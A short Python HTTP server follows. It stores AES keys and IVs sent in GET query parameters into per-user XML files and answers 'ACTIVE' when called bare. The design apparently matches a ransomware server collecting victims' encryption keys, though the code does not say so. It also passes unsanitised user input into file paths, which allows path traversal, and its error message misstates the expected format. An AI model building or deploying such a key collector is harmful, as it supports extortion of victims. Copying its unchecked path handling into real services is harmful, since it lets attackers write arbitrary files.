import os
from urllib.parse import urlparse, parse_qs
from http.server import SimpleHTTPRequestHandler, HTTPServer

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class MyHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)

        aes_key = query_params.get("KEY", [None])[0]
        aes_iv = query_params.get("IV", [None])[0]
        user = query_params.get("USER", [None])[0]

        if not aes_key or not aes_iv or not user:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write("ACTIVE".encode())
            return

        try:
            user_parts = user.split("@")
            if len(user_parts) != 2:
                raise ValueError("USER parameter must be in the format key=value")
            user_dir = os.path.join(UPLOAD_DIR, user_parts[0])
            user_file = os.path.join(user_dir, f"{user_parts[1]}.xml")
        except Exception as e:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(f"Invalid USER parameter: {str(e)}".encode())
            return

        os.makedirs(user_dir, exist_ok=True)

        xml_data = f"""<xml>
    <key>{aes_key}</key>
    <IV>{aes_iv}</IV>
</xml>"""
        with open(user_file, "w", encoding="utf-8") as f:
            f.write(xml_data)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(f"Data saved successfully at {user_file}".encode())

def run(server_class=HTTPServer, handler_class=MyHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
